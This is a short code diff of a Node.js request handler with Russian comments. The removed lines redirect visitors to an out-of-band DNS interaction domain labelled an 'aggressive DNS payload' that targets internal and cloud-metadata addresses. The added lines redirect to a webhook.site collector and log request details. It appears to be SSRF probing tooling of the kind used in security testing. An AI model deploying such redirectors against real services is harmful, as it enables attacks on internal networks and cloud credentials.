@@ -1,11 +1,14 @@
 module.exports = (req, res) => {
-    const yourDomain = 'd4u0slcgtqki566evg0go1br3gxufo98k.oast.site';
-    const requestId = Math.random().toString(36).substring(2, 10);
+    const webhookUrl = 'https://webhook.site/a83dc435-713d-4591-8dbf-2c46d3405492';
     
-    const targetUrl = `http://internal.192-168-1-1.metadata.169-254-169-254.${requestId}.${yourDomain}/`;
+    console.log('Время запроса:', new Date().toISOString());
+    console.log('Путь:', req.url);
+    console.log('User-Agent:', req.headers['user-agent'] || 'Не указан');
     
-    console.log('🎯 Агрессивный DNS-пейлоад:', targetUrl);
-    
-    res.writeHead(302, { 'Location': targetUrl });
+    // Редирект 302 на вебхук
+    res.writeHead(302, {
+        'Location': webhookUrl,
+        'Cache-Control': 'no-store, no-cache, max-age=0'
+    });
     res.end();
 };
